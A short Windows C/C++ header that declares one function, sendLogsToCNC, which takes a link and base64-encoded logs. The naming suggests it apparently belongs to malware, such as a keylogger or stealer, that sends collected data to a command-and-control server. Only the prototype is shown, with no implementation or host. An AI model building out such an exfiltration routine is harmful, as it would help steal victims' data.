#pragma once
#include <windows.h>

void sendLogsToCNC(LPCWSTR GetLink, CHAR* base64Logs, SIZE_T logsSize);